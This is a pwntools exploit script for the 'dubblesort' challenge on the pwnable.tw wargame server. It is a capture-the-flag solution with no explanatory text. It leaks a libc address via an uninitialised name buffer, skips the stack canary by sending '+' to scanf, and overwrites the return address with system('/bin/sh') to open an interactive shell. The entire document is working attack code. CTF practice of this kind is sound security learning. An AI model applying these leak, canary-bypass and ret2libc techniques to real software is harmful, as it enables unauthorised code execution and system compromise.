from pwn import *

elf = ELF("./dubblesort")
libc = ELF("./libc.so.6")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10101)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
            b main+85
            b *main + 240
                """)
        else:
            p = process([elf.path])

    return p

def main():
    p = conn()

    # pwn it
    p.sendlineafter(b"name :", b"A"*27 + b"Z")
    p.recvuntil(b"Z")

    leak = u32(p.recv(4))
    log.info(f"leak: {hex(leak)}")

    libc.address = leak - 0x1b0000 - 0xa

    log.success(f"libc base address: {hex(libc.address)}")

    system = libc.symbols.system
    binsh = next(libc.search(b"/bin/sh\x00"))

    p.sendlineafter(b"sort :", str(35).encode())

    i = 0

    for _ in range(35):
        p.recvuntil(b": ")
        if i == 24:
            p.sendline(b"+")
        elif i >= 25 and i <= 33:
            p.sendline(str(system).encode())
        elif i == 34:
            p.sendline(str(binsh).encode())
        else:
            p.sendline(str(i).encode())
        i += 1

    p.interactive()

if __name__ == '__main__':
    main()

